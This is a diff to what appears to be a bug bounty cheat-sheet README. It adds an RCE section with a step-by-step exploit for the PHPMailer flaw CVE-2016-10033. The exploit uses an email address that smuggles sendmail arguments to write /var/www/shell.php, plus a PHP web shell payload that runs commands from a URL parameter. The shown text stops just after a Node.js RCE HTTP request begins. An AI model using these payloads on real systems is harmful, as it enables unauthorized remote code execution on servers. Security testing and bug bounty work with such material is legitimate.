@@ -19,6 +19,9 @@
 ### BugBounty
   - [Payloads](#payloads)
   - [JSON](#json)
+  - [RCE](#rce)
+     - [PHPMailer](#phpmailer)
+     - [Node.js](#nodejs)
   - [One liner bugbounty](#one-liner-bugbounty)
   - [CMS exploitation](#cms-exploitation)
      - [Wordpress](#wordpress)
@@ -138,6 +141,26 @@ Host: vuln-web.io
 {"username":"admin","password":{"password": 1}}
 ```
 
+# RCE
+### PHPMailer
+##### `CVE-2016-10033: PHPMailer RCE Exploitation`
+
+The exploitation of this issue is done in two steps:
+* Create a file with a PHP extension in the web root of the server.
+* Access the newly created file.
+
+To create the file, you can inject some extra-arguments to the command as part of the email address:
+```http
+"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1
+```
+This will allow us to create the file /var/www/shell.php. To get code execution, we also need to inject a web shell in the email's body:
+```php
+<?php system($_GET['x']);?>
+```
+Finally, you need to access your web shell to execute commands using the `x` parameter.
+
+
+### Node.js
 ##### `node.js calculate() rce with json body`
 ```http
 POST /api/activity HTTP/1.1
